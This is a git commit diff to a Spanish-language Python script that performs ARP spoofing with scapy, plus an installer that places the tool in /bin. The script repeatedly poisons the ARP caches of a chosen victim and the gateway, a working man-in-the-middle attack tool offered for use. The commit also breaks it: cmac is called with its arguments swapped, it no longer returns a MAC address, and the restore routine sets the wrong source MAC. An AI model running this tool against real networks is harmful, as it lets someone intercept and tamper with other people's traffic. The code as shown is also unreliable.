7d53d312fd90772fdb810caa2490b6a3e1458bfa
luijait <60628803+luijait@users.noreply.github.com>
2021-07-18 20:11:31 +0200

    Mejorado todo en general

--- arpspoofing.py
+++ arpspoofing.py
@@ -2,6 +2,7 @@ import sys
 import argparse
 import os
 import scapy.all as scapy
+from scapy.all import srp,send,ARP
 import time
 def enable_disable_linux_route():
         path = '/proc/sys/net/ipv4/ip_forward'
@@ -21,56 +22,59 @@ def control_de_forwarding(verbose=True):
         if verbose:
                 print ("Routing IP habilitado para su host")
 
-def fallo(ip1,ip2):
+def fallo():
     
-        print ("La maquina victima no esta generando trafico\n")
+        print ("La maquina victima no esta generando trafico")
         
         print ("Vuelve a ejecutar el programa")
 
-def cmac(ip):
+def cmac(ip,iface):
         arp_request = scapy.ARP(pdst = ip)
 
         difusion = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
 
         arprequestdifusion = difusion / arp_request
 
-        lista_de_respuestas = scapy.srp(arprequestdifusion, timeout = 5, verbose = False)[0]
+        lista_de_respuestas = scapy.srp(arprequestdifusion,iface, timeout=1,verbose=False)[0]
 
-        return lista_de_respuestas[0][1].hwsrc
+        
+        for i in lista_de_respuestas:
+                print(lista_de_respuestas[1].psrc, lista_de_respuestas[1].hwsrc)
 
-def spoofeo(direccion_ip_obj, ip_spoofeada):
+def spoofeo(direccion_ip_obj, ip_spoofeada,iface):
 
-        paquete = scapy.ARP(pdst = direccion_ip_obj, hwdst = cmac(direccion_ip_obj), psrc = ip_spoofeada)
+        paquete = scapy.ARP(pdst = direccion_ip_obj, hwdst = cmac(iface,direccion_ip_obj), psrc = ip_spoofeada)
 
         scapy.send(paquete, verbose = False)
-def restaurartablas(ip_destino, ip_origen):
+def restaurartablas(ip_destino, ip_origen,iface):
 
-        mac_destino = cmac(ip_destino)
+        mac_destino = cmac(iface,ip_destino)
 
-        mac_origen = cmac(ip_origen)
+        mac_origen = cmac(iface,ip_origen)
 
         paquete = scapy.ARP(pdst = ip_destino, hwdst = mac_destino, psrc = ip_origen, hwsrc = mac_destino)
 
         scapy.send(paquete, verbose = False)
 
 
-print ("Ejecuta el programa de la siguiente manera poniendo como primer argumento la ip victima y como segundo la ip de la puerta de enlace o gateway de su red: sudo python3 arpspoofing.py 192.168.0.10 192.168.1.1")
+#print ("Ejecuta el programa de la siguiente manera poniendo como primer argumento la ip victima y como segundo la ip de la puerta de enlace o gateway de su red: sudo python3 arpspoofing.py 192.168.0.10 192.168.1.1")
 if __name__ == '__main__':
         parser = argparse.ArgumentParser(description="arpspoofing by luijait")
         parser.add_argument("ip_objetivo", help="Host Victima")
         parser.add_argument("gateway_ip", help="Gateway")
+        parser.add_argument("iface", help="nombre de su interfaz de red" )
         parser.add_argument("-v", "--verbose", action="store_true", help="habilitar verbose")
         args = parser.parse_args()
-        ip_objetivo, gateway_ip, verbose = args.ip_objetivo, args.gateway_ip, args.verbose
+        ip_objetivo, gateway_ip,iface, verbose = args.ip_objetivo, args.gateway_ip, args.iface ,args.verbose
         control_de_forwarding()
         try:  
                 paquetes_enviados = 0
 
                 while True:
 
-                        spoofeo(ip_objetivo, gateway_ip)
+                        spoofeo(ip_objetivo, gateway_ip,iface)
 
-                        spoofeo(gateway_ip, ip_objetivo)
+                        spoofeo(gateway_ip, ip_objetivo,iface)
 
                         paquetes_enviados = paquetes_enviados + 2
 
@@ -80,10 +84,12 @@ if __name__ == '__main__':
           
                 
             
-        except IndexError:
-                fallo(ip_objetivo, gateway_ip)
+        #except IndexError:
+         #       fallo()
+          #      print(IndexError)
         except KeyboardInterrupt:
+                pass
                 print("\n Ha parado el programa.... Resteando tablas ARP del objetivo")
-                restaurartablas(gateway_ip, ip_objetivo)
-                restaurartablas(ip_objetivo, gateway_ip)
+                restaurartablas(gateway_ip, ip_objetivo,iface)
+                restaurartablas(ip_objetivo, gateway_ip,iface)
                 print("Ha salido del programa")
---
+++ installer.sh
@@ -0,0 +1,4 @@
+pip3 install -r requirements.txt
+py2bin pyc arpspoofing.py
+chmod +x arpspoofing.pyc
+mv arpspoofing.pyc /bin/arpspoofing
